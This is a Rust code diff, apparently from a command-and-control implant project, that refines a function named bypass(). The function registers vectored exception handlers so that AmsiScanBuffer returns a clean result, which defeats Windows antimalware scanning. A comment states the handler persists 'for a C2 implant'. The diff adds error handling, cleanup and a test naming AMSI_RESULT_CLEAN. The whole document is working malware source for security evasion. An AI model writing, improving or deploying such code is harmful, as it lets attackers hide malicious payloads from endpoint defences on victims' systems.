@@ -59,10 +59,16 @@ pub unsafe fn bypass() {
 
     // Install handler2 first (it will be at position 2 in chain after handler1).
     // Both use first=1 so handler1 (installed second) ends up at the front.
-    let _h2 = AddVectoredExceptionHandler(1, Some(handler2));
-    let h1 = AddVectoredExceptionHandler(1, Some(handler1));
+    // handler2 is persistent — its handle is not stored; it stays in the VEH chain
+    // for the lifetime of the process. This is intentional for a C2 implant.
+    let h2 = AddVectoredExceptionHandler(1, Some(handler2));
+    if h2.is_null() {
+        return; // handler2 registration failed — bypass cannot intercept AmsiScanBuffer
+    }
 
+    let h1 = AddVectoredExceptionHandler(1, Some(handler1));
     if h1.is_null() {
+        RemoveVectoredExceptionHandler(h2); // clean up h2 before aborting
         return;
     }
 
@@ -158,9 +164,10 @@ mod tests {
 
     #[test]
     fn amsi_result_clean_is_zero() {
-        // AMSI_RESULT_CLEAN = 0 per MSDN. handler2 writes 0 to the result pointer.
-        // Documented here so the value is traceable without a Windows SDK reference.
-        assert_eq!(0u32, 0u32);
+        // AMSI_RESULT_CLEAN = 0 per MSDN. handler2 writes this to the result pointer.
+        // Naming the constant makes it the single source of truth.
+        const AMSI_RESULT_CLEAN: u32 = 0;
+        assert_eq!(AMSI_RESULT_CLEAN, 0u32);
     }
 
     #[test]
